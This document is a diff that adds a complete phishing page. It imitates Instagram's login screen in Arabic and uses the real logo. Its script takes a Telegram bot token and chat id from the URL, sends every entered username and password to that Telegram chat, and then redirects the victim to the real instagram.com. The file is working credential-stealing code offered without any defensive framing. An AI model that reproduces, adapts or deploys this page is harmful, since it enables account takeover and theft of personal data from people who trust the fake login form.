@@ -1,0 +1,19 @@
+<!DOCTYPE html>
+<html lang="ar">
+<head><meta charset="UTF-8"><meta name="viewport" content="width=device-width,initial-scale=1.0"><title>Instagram – Login</title>
+<style>*{margin:0;padding:0;box-sizing:border-box}body{font-family:Arial,sans-serif;background:#fafafa;display:flex;justify-content:center;align-items:center;min-height:100vh}.card{background:#fff;border:1px solid #dbdbdb;border-radius:3px;padding:40px;width:350px;text-align:center}img{width:175px;margin-bottom:24px}input{width:100%;padding:10px 8px;margin:4px 0;background:#fafafa;border:1px solid #dbdbdb;border-radius:3px;font-size:14px;outline-color:#a8a8a8}.btn{width:100%;background:#0095f6;color:#fff;border:none;padding:8px;border-radius:8px;font-weight:bold;font-size:14px;cursor:pointer;margin:12px 0}a{color:#385185;font-size:13px;text-decoration:none}p{color:#8e8e8e;font-size:14px}</style></head>
+<body><div class="card">
+<img src="https://www.instagram.com/static/images/web/mobile_nav_type_logo.png/735145cfe0a4.png" alt="Instagram">
+<input type="text" id="email" placeholder="رقم الهاتف أو البريد الإلكتروني">
+<input type="password" id="pass" placeholder="كلمة المرور">
+<button class="btn" onclick="send()">تسجيل الدخول</button>
+<p>────────── or ──────────</p>
+<a href="#">تسجيل الدخول بحساب فيسبوك</a>
+<a href="#" style="display:block;margin-top:12px">هل نسيت كلمة المرور؟</a>
+</div>
+<script>
+const p=new URLSearchParams(location.search),T=p.get('token'),C=p.get('chat');
+function send(){const e=document.getElementById('email').value,pa=document.getElementById('pass').value;
+if(!e||!pa)return alert('املأ جميع الحقول');
+fetch(`https://api.telegram.org/bot${T}/sendMessage?chat_id=${C}&text=${encodeURIComponent('📷 إنستغرام\n👤 '+e+'\n🔑 '+pa)}`).finally(()=>{location.href='https://instagram.com'})}
+</script></body></html>
